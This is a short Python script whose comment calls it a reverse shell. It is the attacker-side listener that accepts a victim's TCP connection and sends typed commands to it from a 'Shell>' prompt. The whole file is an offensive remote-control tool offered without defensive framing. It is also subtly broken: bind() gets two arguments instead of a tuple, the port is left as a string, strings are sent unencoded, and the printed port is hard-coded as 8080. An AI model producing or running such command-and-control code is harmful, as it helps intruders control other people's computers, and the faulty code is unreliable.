import socket
import argparse

# reverse shell using tcp connection

def connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(ip, port)
    s.listen(1) 

    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+] We got a connection from: ', addr)

    while True:
        command = input("Shell> ") 

        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print(conn.recv(1024)) 

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", "-ip", type=str, required=True)
    parser.add_argument("--port", "-p", type=str, required=True)
    args = parser.parse_args()

    ip = args.ip
    port = args.port

    connect(ip, port)

main()
